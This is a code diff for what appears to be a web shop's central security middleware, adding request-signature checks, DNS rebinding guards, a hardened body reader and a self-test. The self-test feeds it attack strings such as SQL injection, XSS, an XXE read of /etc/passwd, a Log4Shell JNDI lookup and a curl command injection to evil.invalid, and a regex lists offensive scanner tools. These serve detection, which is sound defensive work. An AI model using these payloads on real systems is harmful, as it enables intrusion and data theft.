+    const s2sNonce = diracCentralEgressHeaderV225(options, 'x-dirac-nonce');
+    const s2sRequestId = diracCentralEgressHeaderV225(options, 'x-dirac-request-id');
+    const bodyHash = diracCentralEgressHeaderV225(options, 'x-dirac-body-sha512');
+    const expectedTargetServerId = diracS2SIdV206(process.env.DIRAC_RECOVERY_WORKER_SERVER_ID);
+    if (s2sVersion !== DIRAC_S2S_VERSION_V206
+        || s2sPolicy !== DIRAC_S2S_POLICY_V206
+        || networkId !== diracS2STextV206('DIRAC_S2S_NETWORK_ID')
+        || serverId !== diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID'))
+        || targetServerId !== expectedTargetServerId
+        || keyVersion !== diracS2SKeyVersionV206(diracS2STextV206('DIRAC_S2S_KEY_VERSION'))
+        || !Number.isSafeInteger(s2sTimestamp)
+        || Math.abs(Date.now() - s2sTimestamp) > DIRAC_S2S_MAX_CLOCK_SKEW_MS_V206
+        || !/^[A-Za-z0-9_-]{32,160}$/.test(s2sNonce)
+        || !/^[A-Za-z0-9_-]{24,160}$/.test(s2sRequestId)
+        || bodyHash !== diracS2SBodyHashV206(envelope)) return 0;
+
+    s2sMessage = diracS2SCanonicalV206({
+      networkId,
+      serverId,
+      targetServerId,
+      keyVersion,
+      method: 'POST',
+      path: diracS2SPathV206(target),
+      action: DIRAC_RECOVERY_WORKER_ACTION,
+      timestamp: s2sTimestampText,
+      nonce: s2sNonce,
+      requestId: s2sRequestId,
+      bodyHash
+    });
+    for (const spec of diracS2SSignatureSpecsV206()) {
+      const encoded = diracCentralEgressHeaderV225(options, 'x-dirac-signature-' + spec.index);
+      const signature = diracS2SDecodeSignatureV210(encoded);
+      try {
+        const privateKey = diracS2SKeyObjectV206(diracS2STextV206(spec.privateEnv), 'private', spec.type);
+        diracS2SAssertEcCurveV206(privateKey, spec.curve);
+        const publicKey = crypto.createPublicKey(privateKey);
+        if (!spec.verify(s2sMessage, publicKey, signature)) return 0;
+      } finally {
+        signature.fill(0);
+      }
+    }
+
+    const raw = Number(process.env.DIRAC_RECOVERY_WORKER_TIMEOUT_MS || 280000);
+    return Number.isFinite(raw) ? Math.max(5000, Math.min(290000, Math.floor(raw))) : 280000;
+  } catch (error) {
+    diracCentralRecordSuppressedExceptionV221(error);
+    return 0;
+  } finally {
+    if (s2sMessage) s2sMessage.fill(0);
+  }
+}
+
+function diracCentralEgressTimeoutMsV221() {
+  const raw = Number(process.env.DIRAC_EGRESS_TIMEOUT_MS || 25000);
+  return Number.isFinite(raw) ? Math.max(3000, Math.min(60000, Math.floor(raw))) : 25000;
+}
+
+function diracCentralTimeoutOptionsV221(options, exactTimeoutMs) {
+  const base = Object.assign({}, options || {});
+  const controller = new AbortController();
+  const timeoutMs = Number.isSafeInteger(exactTimeoutMs) && exactTimeoutMs >= 3000 && exactTimeoutMs <= 290000
+    ? exactTimeoutMs
+    : diracCentralEgressTimeoutMsV221();
+  let upstreamListener = null;
+  if (base.signal) {
+    if (base.signal.aborted) controller.abort(base.signal.reason);
+    else {
+      upstreamListener = () => controller.abort(base.signal.reason);
+      base.signal.addEventListener('abort', upstreamListener, { once: true });
+    }
+  }
+  const timer = setTimeout(() => {
+    const error = new Error('DIRAC_EGRESS_TIMEOUT');
+    error.code = 'DIRAC_EGRESS_TIMEOUT';
+    controller.abort(error);
+  }, timeoutMs);
+  if (typeof timer.unref === 'function') timer.unref();
+  base.signal = controller.signal;
+  return {
+    options: base,
+    cleanup() {
+      clearTimeout(timer);
+      try { if (upstreamListener && options && options.signal) options.signal.removeEventListener('abort', upstreamListener); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    }
+  };
+}
+
+async function diracCentralFreshDnsV221(host) {
+  try {
+    const rows = await Promise.race([
+      DIRAC_CENTRAL_NATIVE_DNS_LOOKUP_V230(String(host || ''), { all: true, verbatim: true }),
+      new Promise((resolve) => setTimeout(() => resolve([]), 1500))
+    ]);
+    return Array.from(new Set((rows || []).map((row) => String(row && row.address || '')).filter(Boolean))).slice(0, 32);
+  } catch (_) {
+    return [];
+  }
+}
+
+async function diracCentralDnsRebindingGuardV221(host, firstIps) {
+  const second = await diracCentralFreshDnsV221(host);
+  if (!second.length || second.some(diracCentralIsUnsafeIpV146)) return { ok: false, reason: 'egress_dns_rebinding_or_private_ip' };
+  const first = new Set((firstIps || []).map(String));
+  if (first.size && !second.some((ip) => first.has(ip))) return { ok: false, reason: 'egress_dns_answer_changed_without_overlap' };
+  return { ok: true, ips: second };
+}
+
+function diracCentralPipelineDescriptorRuntimeV221() {
+  return SECURITY_PIPELINE.map((entry) => String(entry.name) + ':' + String(entry.stamp)).join('|');
+}
+
+function diracCentralPipelineIntegrityV221(ctx) {
+  if (!Array.isArray(SECURITY_PIPELINE) || !Object.isFrozen(SECURITY_PIPELINE) || SECURITY_PIPELINE.length !== 30) return { ok: false, reason: 'v221_pipeline_shape_invalid' };
+  if (!Object.isFrozen(DIRAC_CENTRAL_PATCH_TARGETS_V221) || DIRAC_CENTRAL_PATCH_TARGETS_V221.length !== 22
+      || new Set(DIRAC_CENTRAL_PATCH_TARGETS_V221).size !== 22) return { ok: false, reason: 'v221_patch_target_manifest_invalid' };
+  const descriptor = diracCentralPipelineDescriptorRuntimeV221();
+  const hash = crypto.createHash('sha256').update(descriptor).digest('hex');
+  if (descriptor !== DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221 || hash !== DIRAC_CENTRAL_PIPELINE_HASH_V221) return { ok: false, reason: 'v221_pipeline_manifest_mismatch' };
+  const names = new Set();
+  const stamps = new Set();
+  const guards = new Set();
+  for (const entry of SECURITY_PIPELINE) {
+    if (!entry || !Object.isFrozen(entry) || typeof entry.guard !== 'function' || names.has(entry.name) || stamps.has(entry.stamp) || guards.has(entry.guard)) {
+      return { ok: false, reason: 'v221_pipeline_duplicate_or_mutable_entry' };
+    }
+    names.add(entry.name);
+    stamps.add(entry.stamp);
+    guards.add(entry.guard);
+  }
+  for (const [name, fn] of Object.entries(DIRAC_CENTRAL_BAN_FUNCTIONS_V221)) {
+    const expectedHash = DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221[name];
+    const actualHash = crypto.createHash('sha256').update(Function.prototype.toString.call(fn)).digest('hex');
+    if (!expectedHash || actualHash !== expectedHash) return { ok: false, reason: 'v221_ban_function_changed_' + name };
+  }
+  const middlewareNames = __diracV202MiddlewareRegistry.map((entry) => String(entry && entry.name || ''));
+  if (middlewareNames.some((name) => !name) || new Set(middlewareNames).size !== middlewareNames.length) return { ok: false, reason: 'v221_middleware_registry_duplicate' };
+  for (const action of DIRAC_CENTRAL_ACTIVE_ACTIONS_V146) {
+    const contract = diracCentralContractForActionV146(action);
+    if (!contract || !Array.isArray(contract.methods) || !contract.methods.length) return { ok: false, reason: 'v221_action_contract_missing_' + action };
+  }
+  if (!readLimitedJsonBody || readLimitedJsonBody.__diracCentralRawJsonV221 !== true) return { ok: false, reason: 'v221_raw_json_guard_missing' };
+  const sourceUniqueness = diracCentralGuardSourceUniquenessV221();
+  if (!sourceUniqueness.ok) return sourceUniqueness;
+  if (!DIRAC_CENTRAL_SELF_TEST_V221 || DIRAC_CENTRAL_SELF_TEST_V221.ok !== true) return { ok: false, reason: 'v221_self_test_not_passed' };
+  if (ctx && diracCentralIsPreflightV221(ctx)) {
+    if (ctx.preflightValidatedV221 !== true) return { ok: false, reason: 'v221_preflight_integrity_missing' };
+    const proofs = ctx.preflightCheckpointProofsV221 && typeof ctx.preflightCheckpointProofsV221 === 'object' ? ctx.preflightCheckpointProofsV221 : {};
+    for (const stage of DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221) {
+      if (!/^[a-f0-9]{64}$/.test(String(proofs[stage] || ''))) return { ok: false, reason: 'v221_preflight_checkpoint_proof_missing_' + stage };
+    }
+    if (Object.keys(proofs).length !== DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.length) return { ok: false, reason: 'v221_preflight_checkpoint_proof_count_invalid' };
+  }
+  return { ok: true };
+}
+
+function diracCentralSelfTestRunV221() {
+  const failures = [];
+  let assertions = 0;
+  const expect = (condition, name) => { assertions += 1; if (!condition) failures.push(name); };
+  const threat = (body, query = {}, action = 'security_report') => {
+    const ctx = { action, body, method: 'POST' };
+    const req = { url: '/api/health?action=' + encodeURIComponent(action), query: { action, ...query }, headers: {} };
+    return diracCentralContextualThreatGuardV221(req, ctx);
+  };
+
+  // Patch target manifest and pipeline lock.
+  expect(DIRAC_CENTRAL_PATCH_TARGETS_V221.length === 22, 'patch_target_count');
+  expect(new Set(DIRAC_CENTRAL_PATCH_TARGETS_V221).size === 22, 'patch_target_uniqueness');
+  expect(Object.isFrozen(DIRAC_CENTRAL_PATCH_TARGETS_V221), 'patch_target_manifest_frozen');
+  expect(DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.length === 19, 'preflight_guard_stage_count');
+  expect(Object.entries(DIRAC_CENTRAL_BAN_FUNCTIONS_V221).every(([name, fn]) =>
+    crypto.createHash('sha256').update(Function.prototype.toString.call(fn)).digest('hex') === DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221[name]), 'ban_functions_byte_locked');
+  const descriptorHash = crypto.createHash('sha256').update(DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221).digest('hex');
+  expect(descriptorHash === DIRAC_CENTRAL_PIPELINE_HASH_V221, 'pipeline_hash_constant');
+
+  // Preflight is validated as a protocol state; it does not remove checkpoints.
+  const preflightBase = {
+    action: 'domain_login', method: 'OPTIONS',
+    headers: {
+      origin: 'https://diracgroup.store',
+      'access-control-request-method': 'POST',
+      'access-control-request-headers': 'content-type, x-csrf-token',
+      'sec-fetch-mode': 'cors'
+    }
+  };
+  expect(diracCentralValidatePreflightV221(preflightBase).ok === true, 'valid_preflight_acceptance');
+  expect(diracCentralValidatePreflightV221({ ...preflightBase, headers: { ...preflightBase.headers, 'access-control-request-headers': 'x-unknown-dangerous-header' } }).ok === false, 'unknown_preflight_header_rejection');
+  expect(diracCentralValidatePreflightV221({ ...preflightBase, headers: { ...preflightBase.headers, origin: 'https://evil.invalid' } }).ok === false, 'foreign_preflight_origin_rejection');
+  const proofCtx = {
+    ...preflightBase,
+    requestId: 'v221-selftest-preflight',
+    policy: ACTION_POLICY.domain_login,
+    headers: {
+      ...preflightBase.headers,
+      'access-control-request-headers': 'content-type, x-csrf-token, x-dirac-page-nonce'
+    }
+  };
+  const proofValidation = diracCentralValidatePreflightV221(proofCtx);
+  proofCtx.preflightValidatedV221 = proofValidation.ok;
+  proofCtx.preflightOriginV221 = proofValidation.origin;
+  proofCtx.preflightRequestedMethodV221 = proofValidation.requestedMethod;
+  proofCtx.preflightRequestedHeadersV221 = proofValidation.requestedHeaders;
+  proofCtx.preflightContextHashV221 = diracCentralPreflightContextHashV221(proofCtx);
+  proofCtx.preflightCheckpointProofsV221 = Object.create(null);
+  let proofChainOk = true;
+  DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.forEach((stage, index) => {
+    proofCtx.currentStageIndexV211 = index + 10;
+    if (!diracCentralVerifyPreflightCheckpointV221(proofCtx, stage).ok) proofChainOk = false;
+  });
+  expect(proofChainOk && Object.keys(proofCtx.preflightCheckpointProofsV221).length === 19, 'all_preflight_guards_execute_and_prove');
+  proofCtx.currentStageIndexV211 = 10;
+  expect(diracCentralVerifyPreflightCheckpointV221(proofCtx, 'server_authentication').ok === false, 'preflight_guard_replay_rejection');
+
+  // Failure taxonomy keeps authentication state distinguishable from confirmed attacks.
+  expect(diracCentralClassifyFailureV221('mfa_required', 'MFA').failureClass === 'authentication_state', 'mfa_failure_classification');
+  expect(diracCentralClassifyFailureV221('sql_injection', 'threat detection').failureClass === 'confirmed_attack', 'attack_failure_classification');
+  expect(diracCentralClassifyFailureV221('provider_timeout', 'circuit breaker').failureClass === 'security_dependency_failure', 'dependency_failure_classification');
+
+  // Canonicalization, JSON pollution and structural limits.
+  expect(diracCentralJsonDuplicateScanV221('{"a":1,"a":2}').duplicate === true, 'duplicate_json_detection');
+  expect(diracCentralJsonDuplicateScanV221('{"a":{"b":1,"b":2}}').duplicate === true, 'nested_duplicate_json_detection');
+  expect(diracCentralJsonDuplicateScanV221('{"a":1,"b":{"c":2}}').ok === true, 'valid_json_acceptance');
+  expect(diracCentralJsonDuplicateScanV221('{"a":1} trailing').malformed === true, 'json_trailing_data_rejection');
+  expect(diracCentralCanonicalVariantsV221('%253Cscript%253E').some((value) => /<script>/i.test(value)), 'multi_stage_canonicalization');
+  expect(diracCentralCanonicalVariantsV221('\uFF1Cscript\uFF1E').some((value) => /<script>/i.test(value)), 'unicode_nfkc_canonicalization');
+  expect(diracCentralPlainJsonStructureV221({ constructor: { prototype: true } }, 0, { nodes: 0 }).ok === false, 'prototype_key_structure_rejection');
+  let deep = {}; let cursor = deep;
+  for (let index = 0; index < 10; index += 1) { cursor.a = {}; cursor = cursor.a; }
+  expect(diracCentralPlainJsonStructureV221(deep, 0, { nodes: 0 }).ok === false, 'deep_structure_rejection');
+
+  // Benign corpus must remain benign.
+  const benignCtx = { action: 'domain_check', body: {}, method: 'GET' };
+  const benignReq = { url: '/api/health?action=domain_check&domain=metadata.com', query: { action: 'domain_check', domain: 'metadata.com' }, headers: {} };
+  expect(diracCentralContextualThreatGuardV221(benignReq, benignCtx).detected === false, 'metadata_domain_false_positive');
+  expect(threat({ reason: 'Read the localStorage documentation and constructor design notes.' }).detected === false, 'benign_security_words_false_positive');
+  expect(threat({ reason: 'Normal customer message: select the preferred perfume.' }).detected === false, 'benign_select_word_false_positive');
+
+  // High-confidence attack corpus.
+  expect(threat({ callback_url: 'http://169.254.169.254/latest/meta-data' }).kind === 'ssrf_private_or_metadata_target', 'ssrf_metadata_detection');
+  expect(threat({ callback_url: 'file:///etc/passwd' }).detected === true, 'ssrf_protocol_detection');
+  expect(threat({ reason: '<svg onload=alert(1)>' }).kind === 'xss', 'xss_detection');
+  expect(threat({ reason: "' UNION SELECT password FROM users--" }).kind === 'sql_injection', 'sqli_detection');
+  expect(threat({ reason: '; curl https://evil.invalid/x' }).kind === 'command_injection_rce', 'command_injection_detection');
+  expect(threat({ reason: '../../etc/passwd' }).kind === 'path_traversal_lfi_rfi', 'path_traversal_detection');
+  expect(threat({ reason: '{"$where":"sleep(10)"}' }).detected === true, 'nosql_injection_detection');
+  expect(threat({ reason: '<!DOCTYPE x [<!ENTITY y SYSTEM "file:///etc/passwd">]>' }).detected === true, 'xxe_detection');
+  expect(threat({ reason: '{{7*7}}' }).kind === 'ssti_template_injection', 'ssti_detection');
+  expect(threat({ reason: '${jndi:ldap://evil.invalid/a}' }).kind === 'log4shell', 'log4shell_detection');
+  expect(threat({ reason: '%0d%0aSet-Cookie:evil=1' }).kind === 'crlf_header_injection', 'crlf_detection');
+  expect(threat({ reason: 'constructor.prototype.polluted=true' }).kind === 'prototype_pollution', 'prototype_pollution_detection');
+
+  // Network, response and policy hardening.
+  expect(diracCentralIsUnsafeIpV146('127.0.0.1') === true, 'ipv4_loopback_rejection');
+  expect(diracCentralIsUnsafeIpV146('169.254.169.254') === true, 'ipv4_metadata_rejection');
+  expect(diracCentralIsUnsafeIpV146('::1') === true, 'ipv6_loopback_rejection');
+  expect(diracCentralIsUnsafeIpV146('8.8.8.8') === false, 'public_ip_acceptance');
+  expect(diracCentralRateProfileV221('domain_login').concurrent <= 3, 'login_concurrency_profile');
+  expect(diracCentralRateProfileV221('create_payment').concurrent <= 4, 'payment_concurrency_profile');
+  const mockRes = { setHeader() { return true; } };
+  diracCentralWrapResponseHeadersV221(mockRes);
+  let crlfRejected = false;
+  try { mockRes.setHeader('X-Test', 'safe\r\nInjected: yes'); } catch (_) { crlfRejected = true; }
+  expect(crlfRejected, 'response_header_crlf_rejection');
+  expect(diracCentralRecordSuppressedExceptionV221(Object.assign(new Error('redacted'), { code: 'SELFTEST' })) === true, 'suppressed_exception_telemetry');
+
+  return Object.freeze({
+    ok: failures.length === 0,
+    failures: Object.freeze(failures.slice()),
+    assertions,
+    targets: DIRAC_CENTRAL_PATCH_TARGETS_V221.length,
+    tested_at: new Date().toISOString(),
+    patch: DIRAC_CENTRAL_HARDENING_V221
+  });
+}
+
+try {
+  const __diracCentralReadLimitedJsonBodyBeforeV221 = typeof readLimitedJsonBody === 'function' ? readLimitedJsonBody : null;
+  if (!__diracCentralReadLimitedJsonBodyBeforeV221) throw new Error('DIRAC_V221_BODY_READER_MISSING');
+  if (!__diracCentralReadLimitedJsonBodyBeforeV221.__diracCentralRawJsonV221) {
+    readLimitedJsonBody = async function readLimitedJsonBodyCentralRawJsonV221(req, limitBytes) {
+      const limit = Math.max(1024, Number(limitBytes || LOGIN_SECURITY_BODY_LIMIT_BYTES || 16 * 1024));
+      if (req && Buffer.isBuffer(req.body)) req.body = req.body.toString('utf8');
+      if (req && req.body === undefined && req && typeof req.on === 'function' && !req.readableEnded) {
+        const raw = await new Promise((resolve, reject) => {
+          let chunks = [];
+          let total = 0;
+          let done = false;
+          const fail = (error) => { if (!done) { done = true; reject(error); } };
+          req.on('data', (chunk) => {
+            if (done) return;
+            const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
+            total += buffer.length;
+            if (total > limit) {
+              const error = new Error('BODY_TOO_LARGE');
+              error.statusCode = 413;
+              error.code = 'BODY_TOO_LARGE';
+              fail(error);
+              return;
+            }
+            chunks.push(buffer);
+          });
+          req.on('end', () => { if (!done) { done = true; resolve(Buffer.concat(chunks).toString('utf8')); } });
+          req.on('error', fail);
+          req.on('aborted', () => { const error = new Error('BODY_ABORTED'); error.code = 'BODY_ABORTED'; fail(error); });
+        });
+        req.body = raw;
+      }
+      if (req && typeof req.body === 'string') {
+        if (Buffer.byteLength(req.body, 'utf8') > limit) {
+          const error = new Error('BODY_TOO_LARGE');
+          error.statusCode = 413;
+          error.code = 'BODY_TOO_LARGE';
+          throw error;
+        }
+        const verifiedRawBodyBufferV230 = Buffer.from(req.body, 'utf8');
+        const verifiedRawBodySha256V230 = crypto
+          .createHash('sha256')
+          .update(verifiedRawBodyBufferV230)
+          .digest('hex');
+
+        const sealedRawJsonDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawJsonV221');
+        const sealedRawBufferDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodyBufferV230');
+        const sealedRawLengthDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodyLengthV230');
+        const sealedRawHashDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodySha256V230');
+
+        const sealedRawBodyBufferV230 = req.__diracRawBodyBufferV230;
+
+        const rawEvidenceValidV230 =
+          sealedRawJsonDescriptorV230 &&
+          sealedRawJsonDescriptorV230.writable === false &&
+          sealedRawJsonDescriptorV230.configurable === false &&
+          sealedRawJsonDescriptorV230.enumerable === false &&
+          typeof sealedRawJsonDescriptorV230.value === 'string' &&
+          sealedRawJsonDescriptorV230.value === req.body &&
+
+          sealedRawBufferDescriptorV230 &&
+          sealedRawBufferDescriptorV230.writable === false &&
+          sealedRawBufferDescriptorV230.configurable === false &&
+          sealedRawBufferDescriptorV230.enumerable === false &&
+          (Buffer.isBuffer(sealedRawBodyBufferV230) ||
+            sealedRawBodyBufferV230 instanceof Uint8Array) &&
+          Buffer.from(sealedRawBodyBufferV230).equals(verifiedRawBodyBufferV230) &&
+
+          sealedRawLengthDescriptorV230 &&
+          sealedRawLengthDescriptorV230.writable === false &&
+          sealedRawLengthDescriptorV230.configurable === false &&
+          sealedRawLengthDescriptorV230.enumerable === false &&
+          Number.isSafeInteger(Number(sealedRawLengthDescriptorV230.value)) &&
+          Number(sealedRawLengthDescriptorV230.value) ===
+            verifiedRawBodyBufferV230.length &&
+
+          sealedRawHashDescriptorV230 &&
+          sealedRawHashDescriptorV230.writable === false &&
+          sealedRawHashDescriptorV230.configurable === false &&
+          sealedRawHashDescriptorV230.enumerable === false &&
+          /^[a-f0-9]{64}$/.test(String(sealedRawHashDescriptorV230.value)) &&
+          String(sealedRawHashDescriptorV230.value) ===
+            verifiedRawBodySha256V230;
+
+        if (!rawEvidenceValidV230) {
+          const error = new Error('RAW_BODY_EVIDENCE_MISMATCH');
+          error.statusCode = 400;
+          error.code = 'RAW_BODY_EVIDENCE_MISMATCH';
+          throw error;
+        }
+        const scan = diracCentralJsonDuplicateScanV221(req.body || '{}');
+        if (scan.duplicate) req.__diracRawJsonDuplicateV221 = scan.key || 'duplicate';
+        if (scan.malformed) req.__diracRawJsonMalformedV221 = scan.reason || 'malformed';
+        if (scan.duplicate) {
+          const error = new Error('DUPLICATE_JSON_KEY');
+          error.statusCode = 400;
+          error.code = 'DUPLICATE_JSON_KEY';
+          throw error;
+        }
+      }
+      return __diracCentralReadLimitedJsonBodyBeforeV221(req, limit);
+    };
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralRawJsonV221', { value: true, enumerable: false });
+  }
+} catch (error) {
+  throw new Error('DIRAC_V221_BODY_READER_INSTALL_FAILED', { cause: error });
+}
+
+
+
+function diracCentralWrapResponseHeadersV221(res) {
+  if (!res || typeof res.setHeader !== 'function' || res.__diracHeaderGuardV221) return;
+  const original = res.setHeader.bind(res);
+  res.setHeader = function diracCentralSafeSetHeaderV221(name, value) {
+    const headerName = String(name || '');
+    if (!/^[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,128}$/.test(headerName)) {
+      const error = new Error('DIRAC_RESPONSE_HEADER_NAME_REJECTED');
+      error.code = 'DIRAC_RESPONSE_HEADER_NAME_REJECTED';
+      throw error;
+    }
+    const values = Array.isArray(value) ? value : [value];
+    if (values.some((item) => /[\r\n\u0000]/.test(String(item === undefined || item === null ? '' : item)))) {
+      const error = new Error('DIRAC_RESPONSE_HEADER_VALUE_REJECTED');
+      error.code = 'DIRAC_RESPONSE_HEADER_VALUE_REJECTED';
+      throw error;
+    }
+    return original(headerName, value);
+  };
+  Object.defineProperty(res, '__diracHeaderGuardV221', { value: true, enumerable: false });
+}
+
+function diracCentralGuardSourceUniquenessV221() {
+  try {
+    const fs = require('fs');
+    const source = fs.readFileSync(__filename, 'utf8');
+    const centralMarker = source.indexOf('DIRAC CENTRAL SECURITY GUARD v146 - FINAL CENTRAL FLOW');
+    const centralSource = centralMarker >= 0 ? source.slice(centralMarker) : '';
+    const centralEmptyCatchCount = (centralSource.match(/catch\s*\([^)]*\)\s*\{\s*\}/g) || []).length;
+    if (!centralSource || centralEmptyCatchCount !== 3) {
+      return { ok: false, reason: 'v221_central_empty_catch_baseline_changed_' + centralEmptyCatchCount };
+    }
+    const requiredNames = [
+      'diracCentralContextualThreatGuardV221',
+      'diracCentralAdvancedContractGuardV221',
+      'diracCentralLayeredRateGuardV221',
+      'diracCentralMfaEnvelopeV221',
+      'diracCentralPipelineIntegrityV221'
+    ];
+    for (const name of requiredNames) {
+      const pattern = new RegExp('(?:function\\s+' + name + '\\s*\\(|const\\s+' + name + '\\s*=)', 'g');
+      const count = (source.match(pattern) || []).length;
+      if (count !== 1) return { ok: false, reason: 'v221_function_declaration_count_' + name + '_' + count };
+    }
+    const counts = new Map();
+    const declarationPattern = /^\s*(?:async\s+)?function\s+([A-Za-z_$][\w$]*)\s*\(/gm;
+    let match;
+    while ((match = declarationPattern.exec(source))) counts.set(match[1], Number(counts.get(match[1]) || 0) + 1);
+    const actualDuplicates = Array.from(counts.entries()).filter((entry) => entry[1] > 1).sort((a, b) => a[0].localeCompare(b[0]));
+    const expectedDuplicates = Object.entries(DIRAC_CENTRAL_LEGACY_DUPLICATE_FUNCTIONS_V221).sort((a, b) => a[0].localeCompare(b[0]));
+    if (JSON.stringify(actualDuplicates) !== JSON.stringify(expectedDuplicates)) {
+      return { ok: false, reason: 'v221_legacy_duplicate_baseline_changed' };
+    }
+    return { ok: true };
+  } catch (_) {
+    return { ok: false, reason: 'v221_source_uniqueness_unavailable' };
+  }
+}
+
+const SECURITY_PIPELINE = Object.freeze([
+  Object.freeze({ name: 'identity', stamp: 'identity_checked', guard: guardIdentityV202 }),
+  Object.freeze({ name: 'memory ban', stamp: 'memory_ban_checked', guard: guardMemoryBanV202 }),
+  Object.freeze({ name: 'persistent ban', stamp: 'persistent_ban_checked', guard: guardPersistentBanV202 }),
+  Object.freeze({ name: 'action format', stamp: 'action_format_checked', guard: guardActionFormatV202 }),
+  Object.freeze({ name: 'alias', stamp: 'alias_checked', guard: guardAliasV202 }),
+  Object.freeze({ name: 'whitelist', stamp: 'whitelist_checked', guard: guardWhitelistV202 }),
+  Object.freeze({ name: 'server role', stamp: 'vercel2_action_checked', guard: guardDeploymentRoleV202 }),
+  Object.freeze({ name: 'ENV partition', stamp: 'server1_env_partition_checked', guard: guardEnvironmentPartitionV202 }),
+  Object.freeze({ name: 'classification', stamp: 'classification_checked', guard: guardClassificationV202 }),
+  Object.freeze({ name: 'rate limit', stamp: 'rate_checked', guard: guardRateLimitV202 }),
+  Object.freeze({ name: 'server authentication', stamp: 'server_guard_checked', guard: guardServerAuthenticationV202 }),
+  Object.freeze({ name: 'browser authenticity', stamp: 'browser_auth_checked', guard: guardBrowserAuthenticityV202 }),
+  Object.freeze({ name: 'CSRF', stamp: 'csrf_checked', guard: guardCsrfV202 }),
+  Object.freeze({ name: 'page nonce', stamp: 'page_nonce_checked', guard: guardPageNonceV202 }),
+  Object.freeze({ name: 'browser signal', stamp: 'browser_signal_checked', guard: guardBrowserSignalsV202 }),
+  Object.freeze({ name: 'device binding', stamp: 'device_checked', guard: guardDeviceBindingV202 }),
+  Object.freeze({ name: 'admin authentication', stamp: 'admin_checked', guard: guardAdminAuthenticationV202 }),
+  Object.freeze({ name: 'public-read policy', stamp: 'public_read_checked', guard: guardPublicReadV202 }),
+  Object.freeze({ name: 'body validation', stamp: 'body_checked', guard: guardBodyV202 }),
+  Object.freeze({ name: 'light guard', stamp: 'light_checked', guard: guardLightV202 }),
+  Object.freeze({ name: 'contract validation', stamp: 'contract_checked', guard: guardContractV202 }),
+  Object.freeze({ name: 'A2F signature', stamp: 'a2f_signature_checked', guard: guardA2FV202 }),
+  Object.freeze({ name: 'security report', stamp: 'security_report_checked', guard: guardSecurityReportV202 }),
+  Object.freeze({ name: 'request sample', stamp: 'sample_checked', guard: guardRequestSampleV202 }),
+  Object.freeze({ name: 'threat detection', stamp: 'threat_checked', guard: guardThreatV202 }),
+  Object.freeze({ name: 'zero-day protection', stamp: 'zeroday_checked', guard: guardZeroDayV202 }),
+  Object.freeze({ name: 'IDOR/BOLA', stamp: 'idor_checked', guard: guardOwnershipV202 }),
+  Object.freeze({ name: 'circuit breaker', stamp: 'circuit_checked', guard: guardCircuitBreakerV202 }),
+  Object.freeze({ name: 'MFA', stamp: 'mfa_checked', guard: guardMfaV202 }),
+  Object.freeze({ name: 'integrity', stamp: 'integrity_checked', guard: guardIntegrityV202 })
+]);
+
 
 const DIRAC_CENTRAL_SCANNER_UA_REGEX_V146 = /\b(?:curl|wget|httpie|fetch-cli|python|python-requests|aiohttp|urllib|requests|mechanize|scrapy|node-fetch|axios|got|undici|go-http-client|java|okhttp|apache-httpclient|libwww-perl|lwp|ruby|php|powershell|httpclient|postman|postmanruntime|insomnia|paw|hoppscotch|burp|burp\s*suite|owasp\s*zap|zap|mitmproxy|fiddler|charles|caido|sqlmap|nuclei|nikto|acunetix|netsparker|invicti|nessus|openvas|qualys|appscan|webinspect|w3af|arachni|skipfish|jaeles|xray|x-ray|whatweb|wpscan|joomscan|droopescan|ffuf|gobuster|dirb|dirbuster|feroxbuster|wfuzz|dirsearch|hydra|medusa|patator|nmap|masscan|zgrab|zmap|shodan|censys|binaryedge|commix|havij|xsser|dalfox|tplmap|ysoserial|metasploit|msfconsole|headlesschrome|phantomjs|selenium|playwright|puppeteer|chromedriver|geckodriver)\b/i;
 const DIRAC_CENTRAL_BROWSER_UA_REGEX_V146 = /\b(chrome|chromium|crios|edg|firefox|fxios|safari|mobile safari)\b/i;
@@ -25202,6 +32886,7 @@ const DIRAC_CENTRAL_ACTION_ALIASES_V146 = Object.freeze({
   'dashboard_summary': 'domain_dashboard_me',
   'customer-summary': 'customer_security_overview',
   'customer_summary': 'customer_security_overview',
+  'customer_security_recovery_codes_verify': 'customer_security_recovery_code_verify',
   'customer-security-status': 'customer_security_status',
   'customer-security-overview': 'customer_security_overview',
   'midtrans-webhook': 'midtrans_webhook',
@@ -25290,14 +32975,14 @@ const DIRAC_CENTRAL_ACTIVE_ACTIONS_V146 = new Set([
   'katalog_parfum',
   'katalog_produk',
   'lihat_produk',
-  DIRAC_RECOVERY_WORKER_ACTION,
   'security_report'
 ]);
 
 const DIRAC_CENTRAL_DISABLED_ACTIONS_V146 = new Set([
   'checkout_order_hp_test',
   'ipaymu_health',
-  'ipaymu_webhook'
+  'ipaymu_webhook',
+  DIRAC_RECOVERY_WORKER_ACTION
 ]);
 
 const DIRAC_CENTRAL_SERVER_ACTIONS_V146 = new Set(['midtrans_webhook', DIRAC_RECOVERY_WORKER_ACTION]);
@@ -25353,6 +33038,7 @@ const DIRAC_CENTRAL_A2F_ACTIONS_V148 = new Set([
   'domain_passkey_status'
 ]);
 const DIRAC_CENTRAL_USER_DATA_ACTIONS_V146 = new Set([
+  ...DIRAC_CENTRAL_VERIFIED_OWNER_ACTIONS_V217,
   'domain_me',
   'domain_dashboard_me',
   'domain_orders',
@@ -25587,7 +33273,7 @@ try {
     };
     Object.defineProperty(readLimitedJsonBody, '__diracCentralBodyCacheV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
